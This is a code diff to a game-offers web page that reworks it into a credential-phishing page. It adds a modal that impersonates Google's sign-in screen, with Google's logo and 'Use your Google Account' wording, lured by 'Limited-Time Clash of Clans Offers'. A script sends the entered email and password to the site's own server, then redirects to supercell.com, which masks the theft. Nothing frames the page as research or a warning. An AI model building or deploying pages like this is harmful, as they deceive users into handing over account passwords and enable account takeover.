@@ -1,14 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
-<head><meta charset="UTF-8">
-<title>ClashSkins Hub</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link href="https://fonts.googleapis.com/css2?family=League+Spartan:wght@400;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
-</head><body>
-<header><h1>ClashSkins Hub</h1><nav><a href="/">Home</a><a href="/offers.html">Offers</a><a href="/login.html">Login/Register</a></nav></header>
-<section class="offers"><!-- dynamic cards inserted via JS --></section>
-<footer><p>© 2025 ClashSkins Hub</p></footer>
+<html>
+<head>
+  <title>Clash Offers</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header>
+  <h1>Limited-Time Clash of Clans Offers</h1>
+</header>
+<main>
+  <div class="offers"></div>
+</main>
+
+<!-- Google OAuth-style Login Modal -->
+<div id="loginModal" class="login-modal">
+  <div class="login-container">
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="google-logo">
+    <h2>Sign in</h2>
+    <p class="login-sub">Use your Google Account</p>
+    <input id="loginEmail" type="email" placeholder="Email or phone">
+    <p class="link">Forgot email?</p>
+    <input id="loginPassword" type="password" placeholder="Password">
+    <p class="link">Learn more</p>
+    <div class="login-actions">
+      <a href="#" class="create-account">Create account</a>
+      <button onclick="login()">Next</button>
+    </div>
+  </div>
+</div>
+
 <script src="script.js"></script>
+<script>
+async function login(){
+  const email=document.getElementById("loginEmail").value;
+  const password=document.getElementById("loginPassword").value;
+  const res=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email,password})});
+  const data=await res.json();
+  if(data.success){
+    window.location.href="https://supercell.com";
+  } else {
+    alert("Login failed. Please try again.");
+  }
+}
+</script>
 </body>
 </html>
